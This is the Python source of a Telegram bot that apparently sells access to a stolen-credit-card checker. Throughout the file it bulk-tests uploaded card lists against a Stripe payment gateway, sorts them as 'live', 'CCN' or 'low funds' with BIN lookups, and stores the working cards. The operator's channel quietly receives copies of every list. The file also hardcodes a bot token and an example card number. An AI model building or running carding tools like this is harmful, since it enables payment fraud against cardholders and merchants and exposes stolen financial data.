import requests
import telebot, time
from telebot import types
from gatet import Tele
import os
import random
import string
import json
from threading import Thread
from telebot.apihelper import ApiTelegramException

# --- Configuration ---
token='7999637227:AAG5zTmez0RFPZdn0G5TlyPcW9RJFgFZMlc'
bot = telebot.TeleBot(token, parse_mode="HTML")
subscriber = '7078403270'
CHANNEL_ID = '-1002724316932'



# --- Global Data Structures ---
allowed_users = []
active_checks = {}
channel_summary_doc_message_ids = {}


def safe_send(*args, **kwargs):
    """Wrap bot.send_message with retry-after logic for rate limits."""
    while True:
        try:
            return bot.send_message(*args, **kwargs)
        except ApiTelegramException as e:
            err = e.result_json or {}
            if err.get("error_code") == 429:
                wait = err.get("parameters", {}).get("retry_after", 5)
                print(f"Rate limited (send), sleeping for {wait}s…")
                time.sleep(wait)
                continue
            raise

def safe_edit(*args, **kwargs):
    """Wrap bot.edit_message_text with retry-after logic for rate limits."""
    while True:
        try:
            return bot.edit_message_text(*args, **kwargs)
        except ApiTelegramException as e:
            err = e.result_json or {}
            if err.get("error_code") == 429:
                wait = err.get("parameters", {}).get("retry_after", 5)
                print(f"Rate limited (edit), sleeping for {wait}s…")
                time.sleep(wait)
                continue
            raise

# --- Persistence Functions ---
def load_allowed_users():
    try:
        with open('allowed_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return [subscriber]

def save_allowed_users():
    with open('allowed_users.json', 'w') as f:
        json.dump(allowed_users, f)

def load_user_live_ccs(chat_id):
    file_path = f'live_ccs_{chat_id}.json'
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_user_live_ccs(chat_id, ccs):
    file_path = f'live_ccs_{chat_id}.json'
    with open(file_path, 'w') as f:
        json.dump(ccs, f, indent=4)

MASTER_FILE = 'master_live_ccs.json'

def load_master_live_ccs():
    try:
        with open(MASTER_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_master_live_ccs(ccs):
    with open(MASTER_FILE, 'w') as f:
        json.dump(ccs, f, indent=4)

# Load initial data
allowed_users = load_allowed_users()

# --- Helper Functions ---
def get_user_info_string(user):
    user_id = user.id
    username = user.username if user.username else "N/A"
    first_name = user.first_name if user.first_name else "N/A"
    last_name = user.last_name if user.last_name else ""
    full_name = f"{first_name} {last_name}".strip()
    return f"User: {full_name} (@{username})\nID: `{user_id}`"

# --- Command Handlers ---
@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in allowed_users:
        bot.reply_to(message, "You don't have access to this bot. Contact @akumaxyz for a subscription. Type /request or click this message and inform @akumaxyz")
        return
    bot.reply_to(message, "Send a .txt file with CCs to check. dm @akumaxyz for any problem")

@bot.message_handler(commands=["add"])
def add_user(message):
    if str(message.chat.id) == subscriber:
        try:
            new_user_id = message.text.split()[1]
            if new_user_id not in allowed_users:
                allowed_users.append(new_user_id)
                save_allowed_users()
                bot.reply_to(message, f"✅ User {new_user_id} added successfully")
            else:
                bot.reply_to(message, f"⚠️ User {new_user_id} already exists")
        except IndexError:
            bot.reply_to(message, "Usage: /add USER_ID")
    else:
        bot.reply_to(message, "🚫 Admin only command")
@bot.message_handler(func=lambda message: message.text.startswith(".chk"))
def manual_check(message):
    current_user_chat_id = str(message.chat.id)

    if current_user_chat_id not in allowed_users:
        bot.reply_to(message, "🚫 You don't have access to this bot.")
        return

    try:
        cc = message.text.split(".chk", 1)[1].strip()
        if not cc:
            bot.reply_to(message, "❌ Please provide a CC after .chk command.\nExample:\n.chk 4387110010734228|01|28|000")
            return
    except IndexError:
        bot.reply_to(message, "❌ Invalid format. Use:\n.chk 4387110010734228|01|28|000")
        return

    bot.reply_to(message, f"⏳ Checking: `{cc}`", parse_mode="Markdown")

    Thread(target=manual_check_thread, args=(message, cc)).start()

@bot.message_handler(commands=["delete"])
def delete_user(message):
    if str(message.chat.id) == subscriber:
        try:
            user_id_to_delete = message.text.split()[1]
            if user_id_to_delete in allowed_users:
                allowed_users.remove(user_id_to_delete)
                save_allowed_users()
                if os.path.exists(f'live_ccs_{user_id_to_delete}.json'):
                    os.remove(f'live_ccs_{user_id_to_delete}.json')
                bot.reply_to(message, f"✅ User {user_id_to_delete} removed")
            else:
                bot.reply_to(message, "⚠️ User not found")
        except IndexError:
            bot.reply_to(message, "Usage: /delete USER_ID")
    else:
        bot.reply_to(message, "🚫 Admin only command. DM @akumaxyz for concerns")

valid_redeem_codes = []

def generate_redeem_code():
    return '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))

@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.chat.id) == subscriber:
        new_code = generate_redeem_code()
        valid_redeem_codes.append(new_code)
        bot.reply_to(message, f"<b>🎉 New Redeem Code 🎉</b>\n\n<code>{new_code}</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, "🚫 Admin only command")

@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    try:
        redeem_code = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Usage: /redeem CODE")
        return

    if redeem_code in valid_redeem_codes:
        if str(message.chat.id) not in allowed_users:
            allowed_users.append(str(message.chat.id))
            save_allowed_users()
            valid_redeem_codes.remove(redeem_code)
            bot.reply_to(message, "✅ Access granted!")
        else:
            bot.reply_to(message, "⚠️ You already have access")
    else:
        bot.reply_to(message, "❌ Invalid code")

@bot.message_handler(commands=["cmnds"])
def show_commands(message):
    commands_text = """
Send a .txt file with CCs to check

Commands:
/get all - Get all your live CCs
/get all bin <BIN> - Filter by BIN
/get all bank <Bank> - Filter by bank
/get all country <Country> - Filter by country
/get_master_data - Admin only (master list)
"""
    bot.reply_to(message, commands_text)

@bot.message_handler(commands=["get"])
def get_live_ccs(message):
    chat_id = str(message.chat.id)
    
    if chat_id not in allowed_users:
        bot.reply_to(message, "🚫 You don't have access to this command")
        return

    args = message.text.split()
    
    if len(args) == 1:
        bot.reply_to(message, "See /cmnds for commands. DM @akumaxyz for any concerns.")
        return

    user_all_live_ccs = load_user_live_ccs(chat_id)

    if not user_all_live_ccs:
        bot.reply_to(message, "❌ No live CCs found. ")
        return

    filtered_ccs = []
    command_type = args[1].lower()

    if command_type == "all":
        if len(args) == 2:
            filtered_ccs = user_all_live_ccs
        elif len(args) >= 4:
            filter_category = args[2].lower()
            filter_value = " ".join(args[3:]).strip().upper()

            for cc_data in user_all_live_ccs:
                if filter_category == "bin" and cc_data['cc'][:6] == filter_value:
                    filtered_ccs.append(cc_data)
                elif filter_category == "bank" and cc_data['bank'].upper() == filter_value:
                    filtered_ccs.append(cc_data)
                elif filter_category == "country" and cc_data['country'].upper() == filter_value:
                    filtered_ccs.append(cc_data)
        else:
            bot.reply_to(message, "❌ Invalid format")
            return
    else:
        bot.reply_to(message, "❌ Invalid command")
        return

    if not filtered_ccs:
        bot.reply_to(message, "❌ No matching CCs found")
        return

    # Generate summary
    total = len(filtered_ccs)
    cvv = sum(1 for cc in filtered_ccs if cc.get('status') in ['Approved', 'Payment Successful', '3DS'])
    ccn = sum(1 for cc in filtered_ccs if cc.get('status') == 'CCN LIVE')
    lowfund = sum(1 for cc in filtered_ccs if cc.get('status') == 'Insufficient Funds')
    
    summary = f"""
✅ 𝐑𝐞𝐬𝐮𝐥𝐭𝐬 ✅

𝐓𝐨𝐭𝐚𝐥: {total}
𝐂𝐕𝐕: {cvv}
𝐂𝐂𝐍: {ccn}
𝐋𝐎𝐖 𝐅𝐔𝐍𝐃𝐒: {lowfund}
"""
    bot.reply_to(message, summary)

    # Generate file
    file_content = "\n".join(
        f"{cc['cc']}|{cc['type']}|{cc['brand']}|{cc['bank']}|{cc['country']} ({cc.get('status','LIVE')})"
        for cc in filtered_ccs
    )
    
    file_name = f"live_ccs_{chat_id}_{int(time.time())}.txt"
    
    try:
        with open(file_name, "w") as f:
            f.write(file_content)
        with open(file_name, "rb") as f:
            bot.send_document(chat_id, f, caption=f"Here are your {len(filtered_ccs)} live CCs")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
    finally:
        if os.path.exists(file_name):
            os.remove(file_name)

@bot.message_handler(commands=["get_master_data"])
def get_master_data(message):
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, "🚫 Admin only command")
        return

    master_ccs = load_master_live_ccs()

    if not master_ccs:
        bot.reply_to(message, "❌ No master CCs found")
        return

    total = len(master_ccs)
    cvv = sum(1 for cc in master_ccs if cc.get('status') in ['Approved', 'Payment Successful', '3DS'])
    ccn = sum(1 for cc in master_ccs if cc.get('status') == 'CCN LIVE')
    lowfund = sum(1 for cc in master_ccs if cc.get('status') == 'Insufficient Funds')
    
    summary = f"""
🔥 𝐌𝐚𝐬𝐭𝐞𝐫 𝐑𝐞𝐬𝐮𝐥𝐭𝐬 🔥

𝐓𝐨𝐭𝐚𝐥: {total}
𝐂𝐕𝐕: {cvv}
𝐂𝐂𝐍: {ccn}
𝐋𝐎𝐖 𝐅𝐔𝐍𝐃𝐒: {lowfund}
"""
    bot.reply_to(message, summary)

    file_content = "\n".join(
        f"{cc['cc']}|{cc['type']}|{cc['brand']}|{cc['bank']}|{cc['country']} ({cc.get('status','LIVE')})"
        for cc in master_ccs
    )
    
    file_name = f"master_live_ccs_{int(time.time())}.txt"
    
    try:
        with open(file_name, "w") as f:
            f.write(file_content)
        with open(file_name, "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"Master list of {len(master_ccs)} live CCs")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
    finally:
        if os.path.exists(file_name):
            os.remove(file_name)

# --- Main Document Handler ---
@bot.message_handler(content_types=["document"])
def handle_document_for_check(message):
    current_user_chat_id = str(message.chat.id)
    
    if current_user_chat_id not in allowed_users:
        bot.reply_to(message, "🚫 You don't have access to this bot")
        return

    if active_checks.get(current_user_chat_id, False):
        bot.reply_to(message, "⚠️ Finish current check first")
        return
    
    # Enforce 50 CC limit for non-admin users
    if current_user_chat_id != subscriber:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            line_count = len(downloaded_file.splitlines())
            if line_count > 30000:
                bot.reply_to(message, "❌ Max 30000 CCs allowed for users")
                return
        except Exception as e:
            bot.reply_to(message, f"❌ File error: {e}")
            return

    active_checks[current_user_chat_id] = True
    Thread(target=process_cc_document, args=(message,)).start()

# --- Callback Handlers ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def menu_callback(call):
    user_id_from_callback = call.data.split('_')[1]
    
    # Prevent multiple stop requests
    if os.path.exists(f'stop_{user_id_from_callback}.stop'):
        bot.answer_callback_query(call.id, "⏳ Stop already requested...")
        return
    
    if str(call.from_user.id) != user_id_from_callback:
        bot.answer_callback_query(call.id, "❌ You can only stop your own check", show_alert=True)
        return
    
    try:
        # Create stop file
        with open(f"stop_{user_id_from_callback}.stop", "w") as file:
            pass
        bot.answer_callback_query(call.id, "🛑 Stopping check...")
        
        # Disable button
        try:
            bot.edit_message_reply_markup(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=None
            )
        except:
            pass
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data in ['u8', 'x'])
def handle_ignore(call):
    bot.answer_callback_query(call.id, "checking bro just wait", show_alert=False)
def manual_check_thread(message, cc):
    chat_id = message.chat.id
    user_info_str = get_user_info_string(message.from_user)

    try:
        # BIN Lookup
        bin_info = {
            'brand': 'Unknown',
            'type': 'Unknown',
            'country': 'Unknown',
            'bank': 'Unknown'
        }
        try:
            data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', timeout=5).json()
            bin_info = {
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'country': data.get('country_name', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
        except Exception as bin_e:
            print(f"BIN lookup error: {bin_e}")

        # Check with Tele
        start_time = time.time()
        try:
            result = Tele(cc)
        except Exception as e:
            result = {"error": str(e)}
            print(f"Tele check error: {e}")

        # Default values
        status = "Declined ❌"
        response_text = "No valid response"

        try:
            if isinstance(result, dict):
                # ✅ Case: Successful card added
                if result.get("success") is True:
                    status = "Approved ✅"
                    response_text = "Card added"

                # ✅ Case: Nested Stripe error
                elif "response" in result and isinstance(result["response"], dict):
                    stripe_err = result["response"].get("error", {})
                    msg = stripe_err.get("message", "Unknown error").strip()
                    code = stripe_err.get("code", "")

                    if code in ["invalid_cvc", "incorrect_cvc"]:
                        status = "CCN LIVE ✅"
                        response_text = msg
                    elif code == "insufficient_funds":
                        status = "Insufficient Funds ✅"
                        response_text = msg
                    elif code in ["card_declined", "do_not_honor"]:
                        status = "Declined ❌"
                        response_text = msg
                    else:
                        response_text = msg

                # ✅ Case: Top-level error string
                elif "error" in result and isinstance(result["error"], str):
                    response_text = result["error"]

                else:
                    response_text = str(result)

            else:
                # ✅ Raw text fallback
                raw = str(result).lower()
                if "security code is invalid" in raw or "invalid cvc" in raw:
                    status = "CCN LIVE ✅"
                elif "invalid card format" in raw:
                    status = "Invalid Format ❌"
                elif "succeeded" in raw or "card added" in raw:
                    status = "Approved ✅"
                elif "insufficient" in raw:
                    status = "Insufficient Funds ✅"
                elif "declined" in raw:
                    status = "Declined ❌"
                response_text = str(result)

        except Exception as e:
            response_text = f"Parsing error: {e}"

        # Output
        msg = f"""
<b>Manual Check</b>

<b>Card:</b> <code>{cc}</code>
<b>Status:</b> {status}
<b>Response:</b> {response_text}

<b>BIN:</b> {cc[:6]} | {bin_info['type']} | {bin_info['brand']}
<b>Bank:</b> {bin_info['bank']}
<b>Country:</b> {bin_info['country']}

Checked in: {time.time()-start_time:.1f}s
"""
        safe_send(chat_id, msg, parse_mode="HTML")
        if status in ["Approved ✅", "Payment Successful ✅", "Insufficient Funds ✅", "CCN LIVE ✅", "3DS ✅"]:
            safe_send(CHANNEL_ID, f"Manual check by {user_info_str}\n\n{msg}", parse_mode="HTML")

    except Exception as e:
        print(f"manual_check_thread error: {e}")
        safe_send(chat_id, f"❌ Error: {e}")


def process_cc_document(message):
    current_user_chat_id = str(message.chat.id)
    user_info_str = get_user_info_string(message.from_user)

    dd = ch = ccn = cvv = lowfund = 0
    current_check_live_ccs = []
    ko = (bot.reply_to(message, "⏳ Processing...").message_id)

    # Download file
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open("combo.txt", "wb") as w:
            w.write(downloaded_file)
    except Exception as e:
        bot.reply_to(message, f"❌ Download error: {e}")
        active_checks[current_user_chat_id] = False
        return

    # Forward input file to channel - FIXED APPROACH
    try:
        # Read the downloaded file and send it to channel
        with open("combo.txt", "rb") as f:
            caption = f"Input file from {user_info_str.splitlines()[0]}\n{user_info_str.splitlines()[1]}"
            sent_doc = bot.send_document(CHANNEL_ID, f, caption=caption)
            channel_summary_doc_message_ids[current_user_chat_id] = sent_doc.message_id
    except Exception as e:
        print(f"Error forwarding input file: {e}")
        # Try alternative method if the first fails
        try:
            bot.forward_message(CHANNEL_ID, message.chat.id, message.message_id)
            print("Used forward_message as fallback")
        except Exception as e2:
            print(f"Fallback forwarding also failed: {e2}")

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            
            # Create initial buttons immediately
            mes = types.InlineKeyboardMarkup(row_width=1)
            mes.add(
                types.InlineKeyboardButton("• Waiting for first card •", callback_data='u8'),
                types.InlineKeyboardButton("• STATUS ➜ Idle •", callback_data='u8'),
                types.InlineKeyboardButton(f"• Payment Success ➜ [ 0 ] •", callback_data='x'),
                types.InlineKeyboardButton(f"• CVV ➜ [ 0 ] •", callback_data='x'),
                types.InlineKeyboardButton(f"• CCN ➜ [ 0 ] •", callback_data='x'),
                types.InlineKeyboardButton(f"• LOW FUNDS ➜ [ 0 ] •", callback_data='x'),
                types.InlineKeyboardButton(f"• DECLINED ➜ [ 0 ] •", callback_data='x'),
                types.InlineKeyboardButton(f"• TOTAL ➜ [ {total} ] •", callback_data='x'),
                types.InlineKeyboardButton("[ STOP ]", callback_data=f'stop_{current_user_chat_id}')
            )
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text=f'Processing 0/{total}...',
                reply_markup=mes
            )
            
            user_all_live_ccs = load_user_live_ccs(current_user_chat_id)
            master_all_live_ccs = load_master_live_ccs()
            last_update = time.time()
            for i, cc in enumerate(lino):
                
                if os.path.exists(f'stop_{current_user_chat_id}.stop'):
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='🛑 Stopped')
                    os.remove(f'stop_{current_user_chat_id}.stop')
                    if current_user_chat_id != subscriber:
                        bot.send_message(subscriber, f"User stopped check: {user_info_str.splitlines()[0]}")
                    break

                cc = cc.strip()
                if not cc: continue

                # Get BIN info
                bin_info = {
                    'brand': 'Unknown',
                    'type': 'Unknown',
                    'country': 'Unknown',
                    'bank': 'Unknown'
                }
                try: 
                    data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', timeout=5).json()
                    bin_info = {
                        'brand': data.get('brand', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'country': data.get('country_name', 'Unknown'),
                        'bank': data.get('bank', 'Unknown')
                    }
                except Exception as bin_e:
                    print(f"BIN lookup error: {bin_e}")

                start_time = time.time()
                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(f"Tele error: {e}")
                    last = "Error"
                    
                # Map decline reasons to user-friendly messages
                if 'Stripe Error: Your card was declined.' in last:
                    last = 'Your Card Was Declined ❌'
                elif 'Declined - Call Issuer' in last:
                    last = 'Declined - Call Issuer'
                elif 'insufficient' in last:
                    last = 'Insufficient Funds'
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    last = 'CCN LIVE'
                elif 'Thanks' in last or 'Thank' in last or 'paid' in last or 'successfully' in last:
                    last = 'Payment Successful'
                elif 'succeeded' in last:
                    last = 'Approved'
                elif 'Verifying' in last:
                    last = '3DS'
                else:
                    last = 'Declined'
                
                # Process response
                cc_data = {
                    'cc': cc,
                    **bin_info,
                    'status': ''
                }
                live_cc_message = None  # For channel
                user_notification = None  # For user

                if 'Payment Successful' in last:
                    ch += 1
                    cc_data['status'] = 'Payment Successful'
                    user_all_live_ccs.append(cc_data)
                    current_check_live_ccs.append(cc_data)
                    user_notification = f"""
𝐂𝐀𝐑𝐃: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge $1
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Payment Successful🔥

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: {cc[:6]}-{bin_info['type']} - {bin_info['brand']}
𝐁𝐚𝐧𝐤: {bin_info['bank']}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country']}

𝐓𝐢𝐦𝐞: {time.time()-start_time:.1f} seconds"""
                    live_cc_message = user_notification
                elif 'Approved' in last:
                    cvv += 1
                    cc_data['status'] = 'Approved'
                    user_all_live_ccs.append(cc_data)
                    current_check_live_ccs.append(cc_data)
                    user_notification = f"""
𝐂𝐀𝐑𝐃: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Approved ✅✅

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: {cc[:6]}-{bin_info['type']} - {bin_info['brand']}
𝐁𝐚𝐧𝐤: {bin_info['bank']}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country']}

𝐓𝐢𝐦𝐞: {time.time()-start_time:.1f} seconds"""
                    live_cc_message = user_notification
                elif 'CCN LIVE' in last:
                    ccn += 1
                    cc_data['status'] = 'CCN LIVE'
                    user_all_live_ccs.append(cc_data)
                    current_check_live_ccs.append(cc_data)
                    user_notification = f"""
𝐂𝐀𝐑𝐃: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: CCN LIVE✅

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: {cc[:6]}-{bin_info['type']} - {bin_info['brand']}
𝐁𝐚𝐧𝐤: {bin_info['bank']}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country']}

𝐓𝐢𝐦𝐞: {time.time()-start_time:.1f} seconds"""
                    live_cc_message = user_notification
                elif 'Insufficient Funds' in last:
                    lowfund += 1
                    cc_data['status'] = 'Insufficient Funds'
                    user_all_live_ccs.append(cc_data)
                    current_check_live_ccs.append(cc_data)
                    user_notification = f"""
𝐂𝐀𝐑𝐃: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge $1
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: INSUFFICIENT FUNDS✅

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: {cc[:6]}-{bin_info['type']} - {bin_info['brand']}
𝐁𝐚𝐧𝐤: {bin_info['bank']}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country']}

𝐓𝐢𝐦𝐞: {time.time()-start_time:.1f} seconds"""
                    live_cc_message = user_notification
                elif '3DS' in last:
                    cvv += 1
                    cc_data['status'] = '3DS'
                    user_all_live_ccs.append(cc_data)
                    current_check_live_ccs.append(cc_data)
                    user_notification = f"""
𝐂𝐀𝐑𝐃: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge $1
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 3DS✅

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: {cc[:6]}-{bin_info['type']} - {bin_info['brand']}
𝐁𝐚𝐧𝐤: {bin_info['bank']}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country']}

𝐓𝐢𝐦𝐞: {time.time()-start_time:.1f} seconds"""
                    live_cc_message = user_notification
                else:
                    dd += 1
                    time.sleep(1)

                # Send real-time notification to USER
                if user_notification:
                    try:
                        bot.send_message(current_user_chat_id, user_notification)
                    except Exception as e:
                        print(f"Error sending to user: {e}")

                # Send to channel
                if live_cc_message:
                    try:
                        # Format for channel
                        channel_msg = f"Live CCs from {user_info_str.splitlines()[0]}\n{user_info_str.splitlines()[1]}\n{live_cc_message}"
                        
                        # Check if we have a summary doc to reply to
                        if current_user_chat_id in channel_summary_doc_message_ids:
                            reply_to_id = channel_summary_doc_message_ids[current_user_chat_id]
                            bot.send_message(
                                CHANNEL_ID,
                                channel_msg,
                                reply_to_message_id=reply_to_id
                            )
                        else:
                            bot.send_message(CHANNEL_ID, channel_msg)
                    except Exception as e:
                        print(f"Error sending to channel: {e}")

                # Create buttons for all cards
                mes = types.InlineKeyboardMarkup(row_width=1)
                mes.add(
                    types.InlineKeyboardButton(f"• {cc} •", callback_data='u8'),
                    types.InlineKeyboardButton(f"• STATUS ➜ {last} •", callback_data='u8'),
                    types.InlineKeyboardButton(f"• Payment Success ➜ [ {ch} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• CVV ➜ [ {cvv} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• CCN ➜ [ {ccn} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• LOW FUNDS ➜ [ {lowfund} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• DECLINED ➜ [ {dd} ] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• TOTAL ➜ [ {total} ] •", callback_data='x'),
                    types.InlineKeyboardButton("[ STOP ]", callback_data=f'stop_{current_user_chat_id}')
                )
                
                now = time.time()
                if now - last_update > 0.5:  # Throttle to once every 0.5 seconds
                    try:
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=ko,
                            text=f'Processing {i+1}/{total}...',
                            reply_markup=mes
                        )
                    except ApiTelegramException as e:
                        if "message is not modified" not in str(e):
                            print(f"Error updating message: {e}")
                    last_update = now


            # Save results
            save_user_live_ccs(current_user_chat_id, user_all_live_ccs)
            if current_check_live_ccs:
                master_all_live_ccs.extend(current_check_live_ccs)
                save_master_live_ccs(master_all_live_ccs)

            # Final summary
            summary = f"""
✅ 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝! ✅

𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬: {total}
𝐂𝐕𝐕: {cvv}
𝐂𝐂𝐍: {ccn}
𝐋𝐨𝐰 𝐅𝐮𝐧𝐝𝐬: {lowfund}
𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {dd}
"""
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=summary)

            # Send results file if any live CCs
            if current_check_live_ccs:
                file_content = "\n".join(
                    f"{cc['cc']}|{cc['type']}|{cc['brand']}|{cc['bank']}|{cc['country']} ({cc['status']})"
                    for cc in current_check_live_ccs
                )
                
                file_name = f"results_{current_user_chat_id}_{int(time.time())}.txt"
                
                try:
                    with open(file_name, "w") as f:
                        f.write(file_content)
                    
                    # Send to user
                    with open(file_name, "rb") as f:
                        bot.send_document(current_user_chat_id, f, caption=f"Results ({len(current_check_live_ccs)} live CCs)")
                    
                    # Send to channel
                    with open(file_name, "rb") as f:
                        caption = f"Live CCs from {user_info_str.splitlines()[0]}\n{user_info_str.splitlines()[1]}\n\n{summary.strip()}"
                        sent_doc = bot.send_document(CHANNEL_ID, f, caption=caption)
                        channel_summary_doc_message_ids[current_user_chat_id] = sent_doc.message_id
                except Exception as e:
                    print(f"Error sending file: {e}")
                finally:
                    if os.path.exists(file_name):
                        os.remove(file_name)
            else:
                bot.send_message(current_user_chat_id, "❌ No live CCs found")
                bot.send_message(CHANNEL_ID, f"❌ No live CCs from {user_info_str.splitlines()[0]}")

    except Exception as e:
        print(f"Error: {e}")
        bot.reply_to(message, f"❌ Processing error: {e}")
    finally:
        if os.path.exists("combo.txt"):
            os.remove("combo.txt")
        active_checks[current_user_chat_id] = False
        if current_user_chat_id in channel_summary_doc_message_ids:
            del channel_summary_doc_message_ids[current_user_chat_id]


# /SEND
@bot.message_handler(commands=["send"])
def broadcast_message(message):
    # only allow the admin to broadcast
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, "🚫 Admin only command")
        return

    # grab everything after “/send ”
    try:
        text = message.text.split(" ", 1)[1]
    except IndexError:
        bot.reply_to(message, "Usage: /send Your message here")
        return

    bot.reply_to(message, f"📤 Broadcasting to {len(allowed_users)} users…")

    def _broadcast():
        successes = 0
        for user_id in allowed_users:
            try:
                bot.send_message(user_id, text)
                successes += 1
            except Exception as e:
                print(f"Failed to send to {user_id}: {e}")
        # notify admin when done
        bot.send_message(message.chat.id,
                         f"✅ Broadcast complete: sent to {successes}/{len(allowed_users)} users.")

    # run in background so the bot stays responsive
    Thread(target=_broadcast, daemon=True).start()

# 1️⃣ User command to request access
@bot.message_handler(commands=["request"])
def request_access(message):
    chat_id = str(message.chat.id)
    # don’t let already-approved users request again
    if chat_id in allowed_users:
        bot.reply_to(message, "✅ You already have access!")
        return

    # build the inline keyboard for admin approval
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{chat_id}"),
        types.InlineKeyboardButton("❌ Decline", callback_data=f"decline_{chat_id}")
    )

    # notify the user we sent the request
    bot.reply_to(message, "⌛ Your request has been sent to admin.")

    # use your helper for neat info (name, @username, ID)
    user_info = get_user_info_string(message.from_user)

    # forward to admin with inline buttons
    bot.send_message(
        subscriber,
        f"📨 *New Access Request*\n\n{user_info}",
        parse_mode="Markdown",
        reply_markup=kb
    )

# 2️⃣ Callback handler for those two buttons
@bot.callback_query_handler(func=lambda c: c.data.startswith(("approve_", "decline_")))
def handle_approval(call):
    action, user_id = call.data.split("_", 1)
    # only the admin may press these
    if str(call.from_user.id) != subscriber:
        bot.answer_callback_query(call.id, "🚫 You’re not allowed to do that.", show_alert=True)
        return

    # remove buttons so they can’t click again
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)

    if action == "approve":
        if user_id not in allowed_users:
            allowed_users.append(user_id)
            save_allowed_users()
            bot.send_message(user_id, "✅ Your access request has been *approved*! You can now use the bot.")
            bot.send_message(subscriber, f"✅ Approved access for `{user_id}`.", parse_mode="Markdown")
        else:
            bot.send_message(subscriber, f"⚠️ `{user_id}` was already approved.", parse_mode="Markdown")
    else:  # decline
        bot.send_message(user_id, "❌ Your access request was *declined*. Contact admin for details.")
        bot.send_message(subscriber, f"❌ Declined access for `{user_id}`.", parse_mode="Markdown")

    bot.answer_callback_query(call.id)

print("Bot started")
bot.infinity_polling()

